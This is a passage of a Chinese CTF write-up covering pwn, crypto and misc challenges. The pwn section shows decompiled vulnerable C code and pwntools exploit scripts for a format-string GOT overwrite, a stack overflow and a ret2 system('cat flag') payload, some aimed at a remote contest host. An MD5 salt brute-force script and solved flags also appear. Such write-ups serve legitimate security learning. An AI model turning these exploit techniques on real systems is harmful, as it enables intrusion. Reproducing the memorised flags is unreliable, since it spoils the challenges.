keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    v4<span class="token punctuation">,</span>    v5<span class="token punctuation">,</span>    v6<span class="token punctuation">,</span>    format<span class="token punctuation">,</span>    v8<span class="token punctuation">,</span>    v9<span class="token punctuation">,</span>    v10<span class="token punctuation">,</span>    v11<span class="token punctuation">,</span>    v12<span class="token punctuation">,</span>    v13<span class="token punctuation">,</span>    v14<span class="token punctuation">,</span>    v15<span class="token punctuation">,</span>    v16<span class="token punctuation">,</span>    v17<span class="token punctuation">,</span>    v18<span class="token punctuation">,</span>    v19<span class="token punctuation">,</span>    v20<span class="token punctuation">,</span>    v21<span class="token punctuation">,</span>    v22<span class="token punctuation">,</span>    v23<span class="token punctuation">,</span>    v24<span class="token punctuation">,</span>    v25<span class="token punctuation">,</span>    v26<span class="token punctuation">,</span>    v27<span class="token punctuation">,</span>    v28<span class="token punctuation">,</span>    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//格式化字符串漏洞</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//覆盖got表中fflush条目指向的地址，将其指向read_flag函数</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>简单运行一下，我们可以构造语句：<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>，然后输入得到：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" class="lazyload"></p><p>可以看到我们的输入被放在了printf函数栈中的第6个位置（这里的%p是c/c++中格式化字符串的参数），格式化字符串漏洞最主要的危害就是可以获取任意地址内容，或者实现任意地址写，那么我们这就是通过任意地址写，来覆盖got表，之前的<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">练习记录</a>中就提到了这些知识。</p><p>既然知道了利用位置，那么直接利用pwntools构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#io = process('./200')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span><span class="token comment" spellcheck="true">#覆盖fflush地址指向的内容，从而实现read_flag跳转</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>exp效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" class="lazyload"></p><h3 id="pwn2–栈溢出"><a href="#pwn2–栈溢出" class="headerlink" title="pwn2–栈溢出"></a>pwn2–栈溢出</h3><blockquote><p>简单的栈溢出啦，很常见的，找到溢出点然后把EIP指向我们的<code>win</code>函数地址即可:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" class="lazyload"></p><p>通过<code>gdb-peda</code>,pattern模块，找到溢出偏移量为76，也就是说只需要构造<code>76*&#39;a&#39; + win_addr</code>即可:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" class="lazyload"></p></blockquote><p>构造exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#ida中有win函数的地址</span>win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span><span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果(因为环境已经关闭，所以只能展示本地效果):</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a99272847.png" class="lazyload"></p><h3 id="pwn3–ret2syscall"><a href="#pwn3–ret2syscall" class="headerlink" title="pwn3–ret2syscall"></a>pwn3–ret2syscall</h3><blockquote><p>pwn3的话稍微比上面两题要难上一点点，不过还在我这个萌新的承受范围之内，先检查一下保护措施：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" class="lazyload"></p><p>可以看到只是开了栈不可执行 （NX)，静态分析一波:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" class="lazyload"></p><p>这里我们也可以看到一个win_func函数，猜测同样是利用返回到该函数从而得到flag，那么如何返回到这个win_func函数呢？</p><p>我们注意到mem_test函数伪c代码如下:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" class="lazyload"></p><p>直接<code>return result</code>，那么如果有溢出存在，那我们能不能覆盖掉这个函数的返回地址呢，那当然是可行的(这题不能直接用pattern create得到偏移量，如果pattern过大则会导致无法覆盖eip），用gdb在mem_test函数下断点调试：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" class="lazyload"></p><p>然后根据之前ida分析变量s的位置为<code>ebp-0x13</code>,我们可以知道，<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>，或者直接在gdb看ebp的值，可以知道<code>0x8048718</code>就是return返回的地址。我们需要将它覆盖成win_func的地址。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" class="lazyload"></p><p>而catflag地址就是一开始输出的那个hint:<code>0x080487E0</code></p></blockquote><p>构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token comment" spellcheck="true">#io = process("./memory")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#padding由栈空间和ebp(0x13+4)组成，system('cat flag')由system函数和catflag参数以及system返回地址组成</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" class="lazyload"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-我这密码忘了。。。"><a href="#Crypto1-我这密码忘了。。。" class="headerlink" title="Crypto1-我这密码忘了。。。"></a>Crypto1-我这密码忘了。。。</h3><blockquote><p>题面有一串base64：VTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p><p>连续解码即可得到：SK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p><p>提交即可。</p></blockquote><h3 id="Crypto2-二战时期的密码"><a href="#Crypto2-二战时期的密码" class="headerlink" title="Crypto2-二战时期的密码"></a>Crypto2-二战时期的密码</h3><blockquote><p>据说是某平台原题，甚至专门去查了一下二战时期的密码学，题面：</p><pre class=" language-c"><code class="language-c">已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>，请分析出flag</code></pre><p>WELCOMETOCFF为密钥，长度为12，而二进制串长度为84，既然密文为二进制，那么可以想到的比较简单的加密操作就是按位与，按位或，以及按位异或。</p><p>尝试后发现是异或操作，将WELCOMETOCFF，分别用七位二进制表示其在字母表中的顺序，并且每对应的七位进行异或操作：</p><pre class=" language-c"><code class="language-c">密文<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>XOR密钥W E L C O M E T O C F F<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>得到：<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>W E L C O M E C I S R G<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span></code></pre><p>提交即可。</p></blockquote><h3 id="Crypto3-被黑了，求密码"><a href="#Crypto3-被黑了，求密码" class="headerlink" title="Crypto3-被黑了，求密码"></a>Crypto3-被黑了，求密码</h3><blockquote><p>摩斯电码解码即可：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" class="lazyload"></p><p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p></blockquote><h3 id="Crypto4-出航了-出航啦！！"><a href="#Crypto4-出航了-出航啦！！" class="headerlink" title="Crypto4-出航了~出航啦！！"></a>Crypto4-出航了~出航啦！！</h3><blockquote><p>根据题面，尝试进行对请求类型进行过滤，发现POST请求只有一个，并且有userid和pswrd：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" class="lazyload"></p><p>尝试将pswrd的值解码后提交flag，成功。</p></blockquote><h3 id="Crypto5-IDC密码破解-未解出"><a href="#Crypto5-IDC密码破解-未解出" class="headerlink" title="Crypto5-IDC密码破解(未解出)"></a>Crypto5-IDC密码破解(未解出)</h3><blockquote><p>给出一串字符<code>js4163633181327481</code></p><p>完全脑洞题：手机九键<code>4163633181327481</code>，没用过的咋活。。。</p></blockquote><h3 id="Crypto6-超级密码"><a href="#Crypto6-超级密码" class="headerlink" title="Crypto6-超级密码"></a>Crypto6-超级密码</h3><blockquote><p>这题给出了大量的md5值，以及类似于base64格式的字符串，很容易就想到hash加盐(salt)的问题，而且隐约记得之前在哪看到过这个题。</p><p>脚本爆破（时间原因，直接从1234567880开始）：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit@jit<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">1234567880</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                n<span class="token operator">=</span><span class="token number">10000000000</span>                <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" class="lazyload"></p><p>flag:1234567890</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-会飞的狗狗"><a href="#Misc1-会飞的狗狗" class="headerlink" title="Misc1-会飞的狗狗"></a>Misc1-会飞的狗狗</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" class="lazyload"></p><p>直接查看文件内容可以得到末尾的base64字符串，接解码得到flag</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" class="lazyload"></p><h3 id="Misc2-文件类型分析"><a href="#Misc2-文件类型分析" class="headerlink" title="Misc2-文件类型分析"></a>Misc2-文件类型分析</h3><blockquote><p>得到一个zip压缩包，点开来看看，存在[content-types].xml文件，基本上可以确定是微软公司office套件的格式。简单试过doc，docx，ppt，pptx，xls，xlxs没用之后，查到xps：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" class="lazyload"></p><p>于是改为xps文件后缀即可，将xps提交。</p></blockquote><h3 id="Misc3-真真假假分不清楚"><a href="#Misc3-真真假假分不清楚" class="headerlink" title="Misc3-真真假假分不清楚"></a>Misc3-真真假假分不清楚</h3><blockquote><p>简单的一个伪加密，修改全局加密标志位，将奇数改为偶数即可。</p><p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p></blockquote><h3 id="Misc4-诱人的音乐"><a href="#Misc4-诱人的音乐" class="headerlink" title="Misc4-诱人的音乐"></a>Misc4-诱人的音乐</h3><blockquote><p>这题的音频文件中存在一段摩斯电码（有的同学通过二进制getflag），通过音频分析软件可以将其提取出来：</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token 